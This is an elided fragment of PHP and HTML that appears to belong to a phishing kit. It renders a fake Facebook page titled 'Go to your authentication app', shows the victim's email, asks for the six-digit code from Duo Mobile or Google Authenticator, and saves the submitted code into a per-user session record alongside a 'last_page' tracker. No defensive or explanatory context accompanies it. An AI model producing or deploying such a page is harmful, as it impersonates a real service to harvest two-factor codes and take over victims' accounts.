...
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $_SESSION['users'][$id]['auth_code'] = $_POST['code'];
    $_SESSION['users'][$id]['last_page'] = 'auth';
...
<body>
        ...
        <div>
            <div class="panel">
                <form id="loginForm" method="post">
                    <p class="userD"><?php echo $userEmail; ?> • Facebook</p>
                    <h2 id="header">Go to your authentication app</h2>
                    <span>Enter the
                        6-digit code for this account from the two-factor authentication app that you set up (such as
                        Duo Mobile or Google Authenticator).
                    </span>
                    <img class="image" src="../images/auth.png" alt="Authentication App">
    ...
    function validateCode() {
        ...
        if (!isNumeric) {
            ...
            customErrorMessage = "The code should consist of six digits.";
            isValid = false;
        }
